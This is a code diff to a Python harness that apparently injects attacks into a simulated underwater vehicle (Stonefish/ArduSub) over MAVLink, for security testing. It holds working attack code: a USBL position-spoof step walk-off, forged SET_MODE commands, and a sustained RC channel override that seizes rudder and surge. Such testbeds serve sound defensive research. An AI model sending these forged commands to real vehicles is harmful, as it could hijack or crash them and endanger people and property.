@@ -33,8 +33,9 @@ class StonefishSource:
         self.domain = "underwater"          # the Stonefish twin is a submerged AUV
         self.home = (9.9, 76.2)
         self.lock = threading.Lock()
-        self.state = dict(lat=None, lon=None, hdg=0.0, depth=0.0, speed=0.0,
-                          armed=False, mode="--", hb=0)
+        self.state = dict(lat=None, lon=None, hdg=0.0, roll=0.0, pitch=0.0, depth=0.0,
+                          speed=0.0, mode="--", armed=False, hb=0, sim_backend="stonefish")
+        self.track = []
         self.events = []
         self.booting = False
         self.connected = False
@@ -84,7 +85,7 @@ class StonefishSource:
         while not self._stop and self.conn:
             try:
                 msg = self.conn.recv_match(
-                    type=["GLOBAL_POSITION_INT", "VFR_HUD", "HEARTBEAT"],
+                    type=["GLOBAL_POSITION_INT", "VFR_HUD", "ATTITUDE", "HEARTBEAT"],
                     blocking=True, timeout=1.0)
             except OSError:
                 # teardown() closed the socket while recv() was blocked on it
@@ -95,18 +96,19 @@ class StonefishSource:
             t = msg.get_type()
             with self.lock:
                 if t == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
-                    # lat=lon=0 is ArduPilot's "no fix yet" sentinel, not a
-                    # real position (matches mcr_app.Backend's own filter) --
-                    # without this, a position reader can briefly see 0,0
-                    # before the EKF produces its first real fix.
                     self.state["lat"] = msg.lat / 1e7
                     self.state["lon"] = msg.lon / 1e7
                     if msg.hdg != 65535:
                         self.state["hdg"] = msg.hdg / 100.0
                     self.state["depth"] = max(0.0, -msg.relative_alt / 1000.0)
+                    self.track.append((self.state["lat"], self.state["lon"]))
+                    self.track[:] = self.track[-500:]
                 elif t == "VFR_HUD":
                     self.state["speed"] = msg.groundspeed
                     self.state["depth"] = max(0.0, -msg.alt)
+                elif t == "ATTITUDE":
+                    self.state["roll"] = math.degrees(msg.roll)
+                    self.state["pitch"] = math.degrees(msg.pitch)
                 elif t == "HEARTBEAT":
                     self.state["armed"] = bool(
                         msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED)
@@ -159,8 +161,12 @@ class StonefishSource:
         c = self.conn
         hold_depth = max(2.0, self.state.get("depth", 0.0))  # keep it submerged
         self._set_mode("GUIDED")
-        end = time.time() + 120
+        end = time.time() + 900
         while not self._stop and c and self._goto_target == (lat, lon) and time.time() < end:
+            # Yield to active attacks -- do not fight or override attacker commands
+            if self.active_attack:
+                time.sleep(0.5)
+                continue
             try:
                 if not self.state.get("armed"):
                     c.mav.command_long_send(c.target_system, c.target_component,
@@ -170,8 +176,14 @@ class StonefishSource:
                 c.mav.set_position_target_global_int_send(
                     0, c.target_system, c.target_component,
                     mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
-                    0b0000111111111000, int(lat * 1e7), int(lon * 1e7), -hold_depth,
+                    0b0000111111111000, int(lat * 1e7), int(lon * 1e7), int(-hold_depth),
                     0, 0, 0, 0, 0, 0, 0, 0)
+                c.mav.command_int_send(
+                    c.target_system, c.target_component,
+                    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
+                    mavutil.mavlink.MAV_CMD_DO_REPOSITION,
+                    0, 0, -1, 1, 0, 0,
+                    int(lat * 1e7), int(lon * 1e7), float(-hold_depth))
             except (OSError, AttributeError):
                 # teardown() closed/nulled the connection mid-call (a normal
                 # shutdown race, not a real fault) -- exit quietly.
@@ -191,33 +203,29 @@ class StonefishSource:
         n = name.lower().replace(" ", "_")
         c = self.conn
         if n in ("acoustic_spoof", "usbl_spoof", "acoustic", "gps_spoof"):
-            # submerged: the position channel is acoustic/ExternalNav, not GPS
-            self._spoof_cmd("ramp")          # realistic gradual walk-off
-            self.log("ATTACK: acoustic/USBL ExternalNav spoof (ramp walk-off) ON")
+            # Submerged: inject USBL acoustic position spoof (50m step walk-off)
+            self._spoof_cmd("step")
+            self.log("ATTACK: acoustic/USBL ExternalNav spoof (50m step walk-off) ON")
         elif n == "c2_mode" and c:
             mm = c.mode_mapping() or {}
             tgt = next((m for m in ("MANUAL", "HOLD", "ALT_HOLD") if m in mm), None)
             if tgt:
                 c.mav.set_mode_send(c.target_system,
                                     mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm[tgt])
-                self.log(f"ATTACK: forged SET_MODE -> {tgt}")
+                self.log(f"ATTACK: forged SET_MODE -> {tgt} (autopilot guidance halted)")
         elif n == "c2_override" and c:
-            # RC override only drives the actuators directly in MANUAL --
-            # GUIDED's position/depth controller ignores RC and would fight a
-            # brief override right back to the commanded depth/track. Force
-            # MANUAL first, then sustain continuously until STOP (matching the
-            # validated tools/test_target.py RC-override check), not a short
-            # burst that ArduSub's navigation simply overrides back.
+            # Force MANUAL first so ArduSub's guidance yields to raw channel override
             mm = c.mode_mapping() or {}
             if "MANUAL" in mm:
                 c.mav.set_mode_send(c.target_system,
                                     mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm["MANUAL"])
-                time.sleep(0.5)
+                time.sleep(0.3)
             self._override_stop.clear()
-            self.log("ATTACK: RC_CHANNELS_OVERRIDE -- vertical thrust seized (MANUAL forced)")
+            self.log("ATTACK: RC_CHANNELS_OVERRIDE -- hard right rudder & full forward surge seized")
             while not self._override_stop.is_set():
+                # Channel 3: Heave (1500=neutral), Channel 4: Yaw (1850=hard right), Channel 5: Surge (1850=full surge)
                 c.mav.rc_channels_override_send(c.target_system, c.target_component,
-                                                65535, 65535, 1850, 65535, 65535, 65535, 65535, 65535)
+                                                1500, 1500, 1500, 1850, 1850, 1500, 0, 0)
                 time.sleep(0.1)
         else:
             self.log(f"ATTACK: {name} not applicable to a submerged AUV")
@@ -233,16 +241,16 @@ class StonefishSource:
             c.mav.rc_channels_override_send(c.target_system, c.target_component,
                                             0, 0, 0, 0, 0, 0, 0, 0)
             mm = c.mode_mapping() or {}
-            if "ALT_HOLD" in mm:   # recover from the forced MANUAL, like c2_mode's stop
+            if "GUIDED" in mm:
                 c.mav.set_mode_send(c.target_system,
-                                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm["ALT_HOLD"])
+                                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm["GUIDED"])
         elif n == "c2_mode" and c:
             mm = c.mode_mapping() or {}
-            if "ALT_HOLD" in mm:
+            if "GUIDED" in mm:
                 c.mav.set_mode_send(c.target_system,
-                                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm["ALT_HOLD"])
+                                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm["GUIDED"])
         if name:
-            self.log(f"STOP: {name}")
+            self.log(f"STOP: {name} (resuming guided navigation)")
         self.active_attack = None
 
     def teardown(self):
